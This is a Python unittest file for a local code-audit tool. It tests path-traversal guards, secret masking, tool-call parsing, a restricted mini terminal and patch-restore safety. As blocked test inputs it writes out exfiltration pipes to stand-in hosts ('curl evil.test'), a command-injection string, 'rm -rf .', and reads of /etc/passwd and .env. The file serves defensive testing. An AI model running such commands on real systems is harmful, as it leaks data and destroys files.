from __future__ import annotations
import json
import os
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

import sys
ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))
import server
import verify_ant_model


class InstallerIntegrityTests(unittest.TestCase):
    def test_ant_model_verifier_rejects_wrong_file_hash(self):
        with tempfile.TemporaryDirectory() as temp:
            sample = Path(temp) / "wrong.gguf"
            sample.write_bytes(b"not the published model")
            with patch.object(verify_ant_model, "EXPECTED_SIZE_BYTES", len(b"not the published model")), \
                 patch.object(sys, "argv", ["verify_ant_model.py", str(sample)]):
                self.assertEqual(verify_ant_model.main(), 3)

    def test_ant_model_verifier_hash_matches_published_sha_reference(self):
        self.assertEqual(
            verify_ant_model.EXPECTED_SHA256,
            "e51582e2c4b1f796aff3a8318b372bd46e2efab0fb4b31a6d01f53f05dd71687",
        )

    def test_auditor_installer_uses_immutable_huggingface_revision(self):
        installer = (ROOT / "install_auditor.bat").read_text(encoding="utf-8")
        self.assertIn("/resolve/76ad17f2fe3f23190f39e256c1add514fa8c8762/antares-1b-Q4_K_M-imat.gguf", installer)
        self.assertIn(".gguf.part", installer)

    def test_auditor_installer_does_not_resume_or_import_unverified_downloads(self):
        installer = (ROOT / "install_auditor.bat").read_text(encoding="utf-8")
        self.assertNotIn("-C -", installer)
        self.assertNotIn("resolve/main/", installer)
        self.assertIn(".gguf.part", installer)
        self.assertIn("EXPECTED_SHA256", (ROOT / "verify_ant_model.py").read_text(encoding="utf-8"))
        self.assertIn("EXPECTED_SIZE_BYTES", (ROOT / "verify_ant_model.py").read_text(encoding="utf-8"))
        self.assertIn('move /y "%PART%" "%REJECTED%"', installer)

    def test_auditor_installer_verifies_before_import(self):
        installer = (ROOT / "install_auditor.bat").read_text(encoding="utf-8")
        verify_at = installer.index('call :verify "%PART%"')
        import_at = installer.index("ollama create %OLLAMA_TAG%")
        self.assertLess(verify_at, import_at)
        self.assertNotIn("ollama rm", installer.lower())
        self.assertIn("ollama show %OLLAMA_TAG%", installer)
        self.assertIn("set_auditor_model.py", installer)
        self.assertIn("antares-1b-raw-e51582e2-v214", installer)

    def test_model_diagnostic_discloses_unverified_ollama_alias_provenance(self):
        diagnostic = (ROOT / "check_model_setup.py").read_text(encoding="utf-8")
        self.assertIn("Untrusted/older Antares tags", diagnostic)
        self.assertIn("Build version", diagnostic)
        self.assertIn("Server module", diagnostic)
        self.assertIn("DUAL_DIAGNOSTIC_SIGNATURE=DUAL-AUDIT-LAB-2.14", diagnostic)
        self.assertIn("EXPECTED_BUILD = \"2.14\"", diagnostic)

    def test_diagnostic_checker_pins_server_to_same_project_folder(self):
        diagnostic = (ROOT / "check_model_setup.py").read_text(encoding="utf-8")
        self.assertIn("Path(server.__file__).resolve() != (ROOT / \"server.py\").resolve()", diagnostic)
        self.assertIn("Extract and run the newest ZIP folder", diagnostic)


class PathAndPrivacyTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.root = Path(self.temp.name).resolve()
        (self.root / "src").mkdir()
        (self.root / "src" / "app.py").write_text("print('hello')\n", encoding="utf-8")

    def tearDown(self):
        self.temp.cleanup()

    def test_safe_relative_existing_file(self):
        self.assertEqual(server.safe_relative(self.root, "src/app.py"), self.root / "src" / "app.py")

    def test_reject_parent_traversal(self):
        with self.assertRaises(ValueError):
            server.safe_relative(self.root, "../outside.txt", must_exist=False)

    def test_reject_absolute_posix(self):
        with self.assertRaises(ValueError):
            server.safe_relative(self.root, "/etc/passwd", must_exist=False)

    def test_reject_windows_absolute(self):
        with self.assertRaises(ValueError):
            server.safe_relative(self.root, "C:\\Windows\\win.ini", must_exist=False)

    def test_reject_env_files(self):
        self.assertTrue(server.is_sensitive_path(".env"))
        self.assertTrue(server.is_sensitive_path("config/.env.production"))
        with self.assertRaises(ValueError):
            server.safe_relative(self.root, ".env", must_exist=False)

    def test_reject_private_key_suffix(self):
        self.assertTrue(server.is_sensitive_path("certs/client.pem"))
        self.assertTrue(server.is_sensitive_path("keys/private.key"))

    def test_mask_assignment_secret(self):
        text = 'API_KEY = "sk-live-1234567890abcdef"\n'
        masked = server.mask_secrets(text)
        self.assertNotIn("sk-live-1234567890abcdef", masked)
        self.assertIn("REDACTED", masked)

    def test_mask_bearer_token(self):
        masked = server.mask_secrets("Authorization: Bearer abcdefghijklmnop123456")
        self.assertNotIn("abcdefghijklmnop123456", masked)
        self.assertIn("REDACTED", masked)

    def test_skip_symlink(self):
        outside = self.root.parent / "outside-dual-test.txt"
        outside.write_text("do not read", encoding="utf-8")
        link = self.root / "src" / "linked.txt"
        try:
            link.symlink_to(outside)
        except (OSError, NotImplementedError):
            outside.unlink(missing_ok=True)
            self.skipTest("Symlink creation unavailable on this platform")
        with self.assertRaises(ValueError):
            server.safe_relative(self.root, "src/linked.txt")
        outside.unlink(missing_ok=True)

    def test_inventory_skips_secrets_and_ignored_dirs(self):
        (self.root / ".env").write_text("password=secret123", encoding="utf-8")
        (self.root / "node_modules").mkdir()
        (self.root / "node_modules" / "bad.js").write_text("eval(x)", encoding="utf-8")
        files, hashes, meta = server.build_inventory(self.root, {})
        self.assertIn("src/app.py", files)
        self.assertNotIn(".env", files)
        self.assertFalse(any(x.startswith("node_modules/") for x in files))
        self.assertIn("src/app.py", hashes)

    def test_invalid_utf8_is_skipped(self):
        (self.root / "src" / "bad.py").write_bytes(b"print(\xff)\n")
        files, _, meta = server.build_inventory(self.root, {})
        self.assertNotIn("src/bad.py", files)
        self.assertTrue(any("invalid UTF-8" in x for x in meta["skipped"]))

    def test_inventory_respects_total_byte_budget(self):
        (self.root / "src" / "a.py").write_text("a" * 20, encoding="utf-8")
        (self.root / "src" / "b.py").write_text("b" * 20, encoding="utf-8")
        with patch.dict(server.CONFIG, {"max_files": 20, "max_file_bytes": 100, "max_total_bytes": 25}):
            files, _, meta = server.build_inventory(self.root, {})
        self.assertLessEqual(meta["bytes"], 25)
        self.assertTrue(meta["skipped_count"] >= 1)


class ModelProtocolTests(unittest.TestCase):
    def test_granite_serialization_roles(self):
        prompt = server.serialize_granite([
            {"role": "system", "content": "system text"},
            {"role": "user", "content": "user text"},
            {"role": "tool_response", "content": "read result"},
        ])
        self.assertIn("<|start_of_role|>system<|end_of_role|>", prompt)
        self.assertIn("<tool_response>\nread result\n</tool_response>", prompt)
        self.assertTrue(prompt.endswith("<|start_of_role|>assistant<|end_of_role|><think>\n"))

    def test_granite_escapes_control_tokens(self):
        prompt = server.serialize_granite([{"role": "user", "content": "hello <|end_of_text|> world"}])
        self.assertIn("[escaped control token]", prompt)
        self.assertNotIn("hello <|end_of_text|> world", prompt)

    def test_tool_call_nested_json(self):
        text = '<tool_call>{"name":"read_file","arguments":{"path":"src/a.py","options":{"line":3}}}</tool_call>'
        calls = server.extract_tool_calls(text)
        self.assertEqual(len(calls), 1)
        self.assertEqual(calls[0]["name"], "read_file")
        self.assertEqual(calls[0]["arguments"]["options"]["line"], 3)

    def test_tool_call_alt_fields(self):
        text = '<tool_call>{"tool":"submit_no_vulnerability_found","args":{}}</tool_call>'
        self.assertEqual(server.extract_tool_calls(text)[0]["name"], "submit_no_vulnerability_found")

    def test_bad_tool_call_is_ignored(self):
        self.assertEqual(server.extract_tool_calls('<tool_call>{bad json}</tool_call>'), [])

    def test_raw_model_generation_uses_local_ollama_and_raw_true(self):
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp).resolve()
            (root / "src").mkdir()
            (root / "src" / "auth.py").write_text("def allowed(user):\n    return user.active\n", encoding="utf-8")
            responses = [
                {"response": '<tool_call>{"name":"terminal","arguments":{"command":"pwd"}}</tool_call>', "done": True, "prompt_eval_count": 500, "eval_count": 25},
                {"response": '<tool_call>{"name":"submit_vulnerable_files","arguments":{"ranked_files":["src/auth.py"]}}</tool_call>', "done": True, "prompt_eval_count": 520, "eval_count": 30},
            ]
            captured = []
            def fake(path, payload=None, method="GET", timeout=15):
                captured.append((path, payload, method))
                if path == "/api/generate" and method == "POST":
                    return responses.pop(0)
                raise AssertionError((path, method))
            job = {"events": []}
            with patch.object(server, "unload_all_except"), patch.object(server, "ollama_request", side_effect=fake):
                found = server.run_antares_cwe(root, {"src/auth.py": "def allowed(user):\n    return user.active\n"}, "CWE-862", "راجع الصلاحيات", job, __import__("threading").Event())
            self.assertEqual(found, ["src/auth.py"])
            calls = [x for x in captured if x[0] == "/api/generate"]
            self.assertEqual(len(calls), 2)
            for _, payload, method in calls:
                self.assertEqual(method, "POST")
                self.assertTrue(payload["raw"])
                self.assertEqual(payload["model"], server.CONFIG["auditor_model"])
                self.assertLessEqual(len(payload["prompt"].encode("utf-8")), 4096 - 420 - 384)
            system = server.build_antares_system_prompt()
            self.assertIn((server.AGENTS_DIR / "coordinator.txt").read_text(encoding="utf-8").strip(), system)
            self.assertIn((server.AGENTS_DIR / "antares_prompt.txt").read_text(encoding="utf-8").strip(), system)
            self.assertIn("read_file", system)
            self.assertIn("submit_vulnerable_files", system)
        self.assertIn("find . -maxdepth 2 | head-20", system)

    def test_antares_initial_prompt_fits_context_on_large_inventory(self):
        files = {f"src/module_{i}.py": "pass\n" for i in range(260)}
        messages = server.build_antares_initial_messages(files, "CWE-862", "اختبار")
        prompt = server.serialize_granite(messages)
        self.assertLessEqual(len(prompt.encode("utf-8")), 2500)
        self.assertIn("Indexed paths (partial)", messages[1]["content"])

    def test_auditor_connection_test_accepts_safe_find_head_call_and_metrics(self):
        captured = {}
        response_text = (
            "I need to inspect the diagnostic sample to understand the codebase structure and locate potential authorization checks. "
            "</think> <tool_call>{\"name\":\"terminal\",\"arguments\":{\"command\":\"find . -maxdepth 2 | head-20\"}}</tool_call> "
            "<think> Now I'll read the main source files to understand th"
        )
        def fake(path, payload=None, method="GET", timeout=15):
            captured.update({"path": path, "payload": payload, "method": method})
            return {"response": response_text, "done": True, "prompt_eval_count": 599, "eval_count": 180}
        with patch.object(server, "unload_all_except"), patch.object(server, "unload_model"), patch.object(server, "ollama_request", side_effect=fake):
            result = server.test_auditor()
        self.assertTrue(result["ok"], result)
        self.assertEqual(captured["path"], "/api/generate")
        self.assertTrue(captured["payload"]["raw"])
        self.assertIn("TOOLS", captured["payload"]["prompt"])
        self.assertEqual(result["stats"]["prompt_eval_count"], 599)
        self.assertEqual(result["stats"]["eval_count"], 180)
        self.assertIn("src/diagnostic_sample.py", result["tool_output"])
        self.assertEqual(result["checks"], {"transport": True, "tool_call_parsed": True, "terminal_safe": True, "terminal_executed": True})
        self.assertEqual(result["diagnostic_command"], "find . -maxdepth 2 | head-20")

    def test_auditor_connection_test_accepts_unclosed_tool_call_wrapper_from_live_excerpt(self):
        # The diagnostic excerpt supplied by the user was cut after the JSON object;
        # a closing </tool_call> tag was not visible. The parser must recover the
        # complete JSON object conservatively without requiring an XML close tag.
        response_text = (
            "I need to inspect the diagnostic sample. </think> "
            '<tool_call>{"name":"terminal","arguments":{"command":"find . -maxdepth 2 | head-20"}} '
            "<think> continuing reasoning"
        )
        def fake(path, payload=None, method="GET", timeout=15):
            return {"response": response_text, "done": True, "prompt_eval_count": 599, "eval_count": 180}
        with patch.object(server, "unload_all_except"), patch.object(server, "unload_model"), patch.object(server, "ollama_request", side_effect=fake):
            result = server.test_auditor()
        self.assertTrue(result["ok"], result)
        self.assertEqual(result["diagnostic_command"], "find . -maxdepth 2 | head-20")
        self.assertTrue(result["checks"]["terminal_executed"])

    def test_auditor_connection_test_accepts_model_max_chars_above_ui_budget(self):
        response_text = '<tool_call>{"name":"terminal","arguments":{"command":"find . -maxdepth 2 | head-20","max_chars":2000}}</tool_call>'
        def fake(path, payload=None, method="GET", timeout=15):
            return {"response": response_text, "done": True, "prompt_eval_count": 599, "eval_count": 180}
        with patch.object(server, "unload_all_except"), patch.object(server, "unload_model"), patch.object(server, "ollama_request", side_effect=fake):
            result = server.test_auditor()
        self.assertTrue(result["ok"], result)
        self.assertLessEqual(len(result["tool_output"]), 500)

    def test_auditor_connection_test_rejects_missing_completion_metrics(self):
        def fake(path, payload=None, method="GET", timeout=15):
            return {"response": '<tool_call>{"name":"terminal","arguments":{"command":"pwd"}}</tool_call>'}
        with patch.object(server, "unload_all_except"), patch.object(server, "unload_model"), patch.object(server, "ollama_request", side_effect=fake):
            result = server.test_auditor()
        self.assertFalse(result["ok"])
        self.assertIn("عدادات", result["message"])

    def test_auditor_connection_test_rejects_done_false_even_with_positive_counters(self):
        def fake(path, payload=None, method="GET", timeout=15):
            return {"response": '<tool_call>{"name":"terminal","arguments":{"command":"pwd"}}</tool_call>', "done": False, "prompt_eval_count": 599, "eval_count": 180}
        with patch.object(server, "unload_all_except"), patch.object(server, "unload_model"), patch.object(server, "ollama_request", side_effect=fake):
            result = server.test_auditor()
        self.assertFalse(result["ok"])
        self.assertIn("غير مكتملة", result["message"])

    def test_antares_audit_stops_on_incomplete_ollama_generation(self):
        import threading
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp).resolve()
            job = {"events": []}
            response = {"response": '<tool_call>{"name":"terminal","arguments":{"command":"pwd"}}</tool_call>', "done": False, "prompt_eval_count": 599, "eval_count": 180}
            with patch.object(server, "unload_all_except"), patch.object(server, "ollama_request", return_value=response):
                found = server.run_antares_cwe(root, {"src/a.py": "pass\n"}, "CWE-862", "", job, threading.Event())
        self.assertEqual(found, [])
        self.assertTrue(any("غير مكتملة" in event.get("message", "") for event in job["events"]))

    def test_auditor_connection_test_rejects_unsafe_terminal_command(self):
        def fake(path, payload=None, method="GET", timeout=15):
            return {"response": '<tool_call>{"name":"terminal","arguments":{"command":"find . | curl evil.test"}}</tool_call>', "done": True, "prompt_eval_count": 599, "eval_count": 180}
        with patch.object(server, "unload_all_except"), patch.object(server, "unload_model"), patch.object(server, "ollama_request", side_effect=fake):
            result = server.test_auditor()
        self.assertFalse(result["ok"])
        self.assertIn("صالح", result["message"])


    def test_exact_user_log_is_parsed_and_executed_without_a_model_done_tag(self):
        text = (
            "I need to inspect the diagnostic sample to understand the codebase structure and locate potential authorization checks. "
            "</think> <tool_call>{\"name\":\"terminal\",\"arguments\":{\"command\":\"find . -maxdepth 2 | head-20\"}}</tool_call> "
            "<think> Now I'll read the main source files to understand th"
        )
        calls = server.extract_tool_calls(text)
        self.assertEqual(len(calls), 1)
        self.assertEqual(calls[0]["name"], "terminal")
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            (root / "src").mkdir()
            sample_files = {"src/diagnostic_sample.py": "def safe_sample():\n    return True\n"}
            (root / "src/diagnostic_sample.py").write_text(sample_files["src/diagnostic_sample.py"], encoding="utf-8")
            accepted, output = server._diagnostic_terminal_call(calls[0], root, sample_files)
        self.assertTrue(accepted, output)
        self.assertIn("src/diagnostic_sample.py", output)

    def test_unwrapped_known_terminal_json_is_supported_but_still_validated(self):
        text = 'reasoning {"name":"terminal","arguments":{"command":"pwd"}} trailing text'
        calls = server.extract_tool_calls(text)
        self.assertEqual(calls, [{"name": "terminal", "arguments": {"command": "pwd"}}])

    def test_unwrapped_unknown_tool_json_is_ignored(self):
        self.assertEqual(server.extract_tool_calls('{"name":"delete_everything","arguments":{}}'), [])

    def test_auditor_diagnostic_returns_each_protocol_gate_separately(self):
        response_text = '<tool_call>{"name":"terminal","arguments":{"command":"find . -maxdepth 2 | head-20"}}</tool_call>'
        def fake(path, payload=None, method="GET", timeout=15):
            return {"response": response_text, "done": True, "prompt_eval_count": 599, "eval_count": 180}
        with patch.object(server, "unload_all_except"), patch.object(server, "unload_model"), patch.object(server, "ollama_request", side_effect=fake):
            result = server.test_auditor()
        self.assertTrue(result["ok"], result)
        self.assertEqual(set(result["checks"]), {"transport", "tool_call_parsed", "terminal_safe", "terminal_executed"})
        self.assertTrue(all(result["checks"].values()))


class WorkflowPolicyTests(unittest.TestCase):
    def test_coder_review_interleaves_static_and_antares_candidates(self):
        items = [
            {"id": "a1", "source": "antares-file-localization"},
            {"id": "s1", "source": "static-rule"},
            {"id": "a2", "source": "antares-file-localization"},
            {"id": "s2", "source": "static-rule"},
            {"id": "a3", "source": "antares-file-localization"},
        ]
        selected = server.prioritize_findings_for_coder(items, 4)
        self.assertEqual([x["id"] for x in selected], ["s1", "a1", "s2", "a2"])

    def test_warning_event_makes_run_completed_with_warnings(self):
        status = server.completion_status({"skipped_count": 0}, [], [{"kind": "warning"}])
        self.assertEqual(status, "completed_with_warnings")

    def test_clean_run_can_be_completed(self):
        status = server.completion_status({"skipped_count": 0}, [], [{"kind": "success"}])
        self.assertEqual(status, "completed")


class SafeToolTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.root = Path(self.temp.name).resolve()
        (self.root / "src").mkdir()
        (self.root / "src" / "app.py").write_text("import os\nos.system(user_input)\nprint('ok')\n", encoding="utf-8")
        (self.root / ".env").write_text("SECRET=topsecret", encoding="utf-8")
        self.files = {"src/app.py": (self.root / "src" / "app.py").read_text(encoding="utf-8")}

    def tearDown(self):
        self.temp.cleanup()

    def test_mini_terminal_pwd(self):
        self.assertIn("repository root", server._mini_terminal(self.root, "pwd", self.files))

    def test_mini_terminal_read_file(self):
        result = server._mini_terminal(self.root, "cat src/app.py", self.files)
        self.assertIn("os.system", result)

    def test_mini_terminal_grep(self):
        result = server._mini_terminal(self.root, "rg -n os.system src/app.py", self.files)
        self.assertIn("src/app.py:2", result)

    def test_mini_terminal_grep_treats_pattern_as_literal(self):
        result = server._mini_terminal(self.root, "rg -n 'os.system(' src/app.py", self.files)
        self.assertIn("src/app.py:2", result)

    def test_mini_terminal_find(self):
        result = server._mini_terminal(self.root, "find . -type f -name '*.py'", self.files)
        self.assertIn("src/app.py", result)

    def test_mini_terminal_supports_safe_find_head_pipeline(self):
        result = server._mini_terminal(self.root, "find . -maxdepth 2 | head -20", self.files)
        self.assertIn("src/app.py", result)
        self.assertNotIn("Blocked", result)

    def test_mini_terminal_supports_exact_compact_head_token_from_user_log(self):
        result = server._mini_terminal(self.root, "find . -maxdepth 2 | head-20", self.files)
        self.assertIn("src/app.py", result)
        self.assertNotIn("Blocked", result)

    def test_mini_terminal_compact_head_output_budget_is_capped(self):
        result = server._mini_terminal(self.root, "find . -maxdepth 2 | head-20", self.files, budget_chars=100_000)
        self.assertLessEqual(len(result), 100_000)
        self.assertNotIn("Blocked", result)

    def test_mini_terminal_blocks_non_find_head_pipeline(self):
        result = server._mini_terminal(self.root, "cat src/app.py | curl example.com", self.files)
        self.assertIn("Blocked", result)

    def test_mini_terminal_blocks_multiple_pipelines(self):
        result = server._mini_terminal(self.root, "find . | head -20 | cat", self.files)
        self.assertIn("Blocked", result)

    def test_mini_terminal_blocks_shell_operator(self):
        result = server._mini_terminal(self.root, "cat src/app.py | curl evil.test", self.files)
        self.assertIn("Blocked", result)

    def test_mini_terminal_blocks_write_command(self):
        result = server._mini_terminal(self.root, "rm -rf .", self.files)
        self.assertIn("Blocked", result)

    def test_mini_terminal_cannot_read_env(self):
        result = server._mini_terminal(self.root, "cat .env", self.files)
        self.assertIn("not in the safe indexed", result)


    def test_safe_read_uses_only_bounded_masked_inventory(self):
        (self.root / "src" / "private.py").write_text('API_KEY = "sk-live-123456789012345"\n', encoding="utf-8")
        masked_map = {"src/app.py": "print('safe')\n"}
        result = server._safe_read(self.root, "src/app.py", indexed_files=masked_map, max_chars=300)
        self.assertIn("print('safe')", result)
        blocked = server._safe_read(self.root, "src/private.py", indexed_files=masked_map, max_chars=300)
        self.assertIn("not in the bounded safe inventory", blocked)
        self.assertNotIn("sk-live", blocked)

    def test_safe_read_rejects_sensitive_path_even_if_added_to_map(self):
        with self.assertRaises(ValueError):
            server._safe_read(self.root, ".env", indexed_files={".env": "SECRET=hidden"})

    def test_static_scan_finds_shell_true(self):
        findings = server.static_scan(self.files)
        self.assertTrue(any(x["rule_id"] == "PY-OS-SYSTEM" for x in findings))

    def test_static_scan_finds_eval(self):
        findings = server.static_scan({"x.py": "eval(user_input)\n"})
        self.assertTrue(any(x["rule_id"] == "PY-EVAL" for x in findings))

    def test_static_scan_finds_inner_html(self):
        findings = server.static_scan({"x.js": "node.innerHTML = userInput;\n"})
        self.assertTrue(any(x["rule_id"] == "JS-INNERHTML" for x in findings))

    def test_static_scan_masks_secret_evidence(self):
        findings = server.static_scan({"config.py": 'API_KEY = "sk-live-123456789012"\n'})
        self.assertTrue(findings)
        self.assertNotIn("sk-live-123456789012", findings[0]["evidence"])


class PatchAndBackupTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.root = Path(self.temp.name).resolve()
        self.file = self.root / "app.py"
        self.original = b"def value():\r\n    return 1\r\n"
        self.file.write_bytes(self.original)
        self.backup_root = server.BACKUPS_DIR
        self.reports_root = server.REPORTS_DIR
        self.old_job = server.JOB
        self.run_id = "abc123def456"
        finding = {
            "id": "f001", "path": "app.py", "source": "static-rule", "rule_id": "PY-EVAL",
            "title": "test", "repair_status": "pending_approval",
            "patch": {"path": "app.py", "old_text": "return 1", "new_text": "return 2", "base_hash": server.sha256_bytes(self.original), "finding_id": "f001"},
        }
        server.JOB = {
            "report_id": self.run_id, "project": str(self.root), "running": False,
            "findings": [finding], "summary": {}, "events": [], "created_at": server.now_iso(), "status": "completed",
        }

    def tearDown(self):
        server.JOB = self.old_job
        self.temp.cleanup()
        shutil = __import__("shutil")
        import shutil as sh
        sh.rmtree(self.backup_root / self.run_id, ignore_errors=True)
        # Each test-generated report bundle has three formats. Remove all of
        # them so local test runs never leak dummy reports into the UI.
        for suffix in (".json", ".md", ".sarif.json"):
            (self.reports_root / f"{self.run_id}{suffix}").unlink(missing_ok=True)

    def test_apply_and_preserve_crlf(self):
        result = server.apply_finding("f001")
        self.assertIn("طُبّق", result["message"])
        changed = self.file.read_bytes()
        self.assertIn(b"return 2\r\n", changed)
        self.assertNotIn(b"\n", changed.replace(b"\r\n", b""))

    def test_restore_original(self):
        server.apply_finding("f001")
        result = server.restore_backups()
        self.assertEqual(self.file.read_bytes(), self.original)
        self.assertEqual(result["restored"], ["app.py"])

    def test_multiple_approved_patches_on_same_file_share_one_original_backup(self):
        server.apply_finding("f001")
        base_hash = server.sha256_bytes(self.original)
        server.JOB["findings"].append({
            "id": "f002", "path": "app.py", "source": "static-rule", "rule_id": "PY-EVAL",
            "title": "second test", "repair_status": "pending_approval",
            "patch": {"path": "app.py", "old_text": "return 2", "new_text": "return 3", "base_hash": base_hash, "finding_id": "f002"},
        })
        second = server.apply_finding("f002")
        self.assertIn("طُبّق", second["message"])
        self.assertIn(b"return 3\r\n", self.file.read_bytes())
        result = server.restore_backups()
        self.assertEqual(self.file.read_bytes(), self.original)
        self.assertEqual(result["restored"], ["app.py"])

    def test_apply_rejects_stale_file(self):
        self.file.write_text("user changed this", encoding="utf-8")
        result = server.apply_finding("f001")
        self.assertIn("تغير الملف", result["message"])
        self.assertEqual(self.file.read_text(encoding="utf-8"), "user changed this")

    def test_restore_skips_user_modified_after_apply(self):
        server.apply_finding("f001")
        self.file.write_text("user changed after apply", encoding="utf-8")
        result = server.restore_backups()
        self.assertEqual(self.file.read_text(encoding="utf-8"), "user changed after apply")
        self.assertEqual(len(result["skipped"]), 1)

    def test_restore_rejects_backup_manifest_traversal(self):
        import json
        import shutil
        folder = self.backup_root / self.run_id
        folder.mkdir(parents=True, exist_ok=True)
        outside = self.root / "outside.bin"
        outside.write_bytes(b"must not be restored")
        self.file.write_bytes(b"modified after patch")
        manifest = {
            "app.py": {
                "backup": "../../outside.bin",
                "original_hash": server.sha256_bytes(b"must not be restored"),
                "latest_hash": server.sha256_bytes(b"modified after patch"),
            }
        }
        (folder / "manifest.json").write_text(json.dumps(manifest), encoding="utf-8")
        result = server.restore_backups()
        self.assertEqual(self.file.read_bytes(), b"modified after patch")
        self.assertEqual(len(result["restored"]), 0)
        self.assertEqual(len(result["skipped"]), 1)

    def test_restore_rejects_symlink_backup_file(self):
        import json
        folder = self.backup_root / self.run_id
        (folder / "nested").mkdir(parents=True, exist_ok=True)
        outside = self.root / "outside.bin"
        outside.write_bytes(self.original)
        backup_link = folder / "nested" / "app.py"
        try:
            backup_link.symlink_to(outside)
        except (OSError, NotImplementedError):
            self.skipTest("Symlink creation unavailable on this platform")
        self.file.write_bytes(b"modified after patch")
        manifest = {
            "app.py": {
                "backup": "nested/app.py",
                "original_hash": server.sha256_bytes(self.original),
                "latest_hash": server.sha256_bytes(b"modified after patch"),
            }
        }
        (folder / "manifest.json").write_text(json.dumps(manifest), encoding="utf-8")
        result = server.restore_backups()
        self.assertEqual(self.file.read_bytes(), b"modified after patch")
        self.assertEqual(len(result["restored"]), 0)
        self.assertEqual(len(result["skipped"]), 1)

    def test_no_apply_without_pending_patch(self):
        server.JOB["findings"][0]["repair_status"] = "failed"
        with self.assertRaises(ValueError):
            server.apply_finding("f001")


class ValidationAndRuntimeTests(unittest.TestCase):
    def test_cwe_selection_prefers_user_explicit(self):
        findings = [{"cwe": "CWE-89"}]
        self.assertEqual(server.choose_cwes(findings, "focus on CWE-79 and CWE-89"), ["CWE-79", "CWE-89"])

    def test_cwe_selection_uses_static_evidence(self):
        self.assertEqual(server.choose_cwes([{"cwe": "CWE-89"}, {"cwe": "CWE-89"}, {"cwe": "CWE-78"}], ""), ["CWE-89"])

    def test_cwe_selection_does_not_invent_default_audit_scope(self):
        self.assertEqual(server.choose_cwes([], "general review"), [])

    def test_cwe_scope_reports_unsupported_and_excess_requests(self):
        selected, skipped = server.resolve_cwe_scope([], "CWE-89 CWE-78 CWE-12345")
        self.assertEqual(selected, ["CWE-89", "CWE-78"])
        self.assertEqual(skipped, ["CWE-12345"])
        selected, skipped = server.resolve_cwe_scope([], "CWE-79 CWE-89 CWE-78")
        self.assertEqual(selected, ["CWE-79", "CWE-89"])
        self.assertEqual(skipped, ["CWE-78"])

    def test_model_test_signature_tracks_installed_model_digest(self):
        status = {"version": "0.40.11", "coder_active_model": "qwen2.5-coder:1.5b", "coder_digest": "abc", "auditor_model": "antares-1b-raw-e51582e2-v214", "auditor_digest": "xyz"}
        signature = server.model_test_signature(status)
        self.assertTrue(server.model_tests_are_current(status, {"coder_test": {"ok": True}, "auditor_test": {"ok": True}, "signature": signature}))
        changed = dict(status, auditor_digest="changed")
        self.assertFalse(server.model_tests_are_current(changed, {"coder_test": {"ok": True}, "auditor_test": {"ok": True}, "signature": signature}))

    def test_reports_generate_markdown_and_sarif(self):
        report = {"id":"abc123def456", "project_label":"demo", "status":"completed_with_warnings", "created_at":"now", "finished_at":"later", "summary":{"findings_total":1}, "inventory":{"files":1,"bytes":20,"skipped_count":0,"skipped":[]}, "limitations":["candidate only"], "findings":[{"title":"Eval indicator","path":"src/a.py","line":4,"source":"static-rule","severity":"high","cwe":"CWE-95","rule_id":"PY-EVAL","explanation":"eval risk"}]}
        markdown = server.report_to_markdown(report)
        sarif = server.report_to_sarif(report)
        self.assertIn("# تقرير DUAL Audit Lab", markdown)
        self.assertIn("src/a.py", markdown)
        self.assertEqual(sarif["version"], "2.1.0")
        result = sarif["runs"][0]["results"][0]
        self.assertEqual(result["ruleId"], "PY-EVAL")
        self.assertEqual(result["locations"][0]["physicalLocation"]["region"]["startLine"], 4)
        self.assertEqual(result["kind"], "review")
        self.assertEqual(result["level"], "warning")

    def test_save_report_writes_json_markdown_and_sarif_and_masks_secrets(self):
        with tempfile.TemporaryDirectory() as temp:
            old_dir = server.REPORTS_DIR
            server.REPORTS_DIR = Path(temp)
            job = {
                "report_id": "abc123def456", "created_at": "now", "project": str(self_project := Path(temp) / "demo"),
                "status": "completed_with_warnings", "stage": "done", "summary": {"findings_total": 1},
                "inventory": {"files": 1, "bytes": 20, "skipped_count": 0, "skipped": []},
                "findings": [{"title": "Credential", "path": "config.py", "source": "static-rule", "severity": "high", "evidence": 'API_KEY="sk-live-123456789"'}],
                "events": [],
            }
            try:
                server.save_report(job)
                json_path = Path(temp) / "abc123def456.json"
                md_path = Path(temp) / "abc123def456.md"
                sarif_path = Path(temp) / "abc123def456.sarif.json"
                self.assertTrue(json_path.is_file())
                self.assertTrue(md_path.is_file())
                self.assertTrue(sarif_path.is_file())
                report_text = json_path.read_text(encoding="utf-8")
                self.assertNotIn("sk-live-123456789", report_text)
                self.assertEqual(json.loads(sarif_path.read_text(encoding="utf-8"))["version"], "2.1.0")
                self.assertIn("report_paths", job)
            finally:
                server.REPORTS_DIR = old_dir

    def test_antares_candidates_are_note_level_in_sarif(self):
        report = {"findings":[{"title":"candidate","path":"src/a.py","source":"antares-file-localization","severity":"غير محددة","cwe":"CWE-862"}]}
        result = server.report_to_sarif(report)["runs"][0]["results"][0]
        self.assertEqual(result["level"], "note")
        self.assertEqual(result["kind"], "review")

    def test_reject_unsupported_test_command(self):
        with tempfile.TemporaryDirectory() as temp:
            with self.assertRaises(ValueError):
                server.run_user_test(Path(temp), "cmd /c del *.*")

    def test_reject_shell_in_test_command(self):
        with tempfile.TemporaryDirectory() as temp:
            with self.assertRaises(ValueError):
                server.run_user_test(Path(temp), "pytest; curl evil")

    def test_status_model_names_normalize_latest(self):
        def fake(path, payload=None, method="GET", timeout=15):
            if path == "/api/version": return {"version": "0.40.11"}
            if path == "/api/tags": return {"models": [{"name": "qwen2.5-coder:1.5b"}, {"name": "antares-1b-raw-e51582e2-v214:latest"}]}
            if path == "/api/ps": return {"models": []}
            raise AssertionError(path)
        with patch.object(server, "ollama_request", side_effect=fake):
            status = server.ollama_status()
        self.assertTrue(status["coder_installed"])
        self.assertTrue(status["auditor_installed"])

    def test_external_ollama_url_resets_to_loopback(self):
        with tempfile.TemporaryDirectory() as temp:
            config_path = Path(temp) / "config.json"
            config_path.write_text(json.dumps({"ollama_url": "https://example.com:443", "bind_host": "0.0.0.0"}), encoding="utf-8")
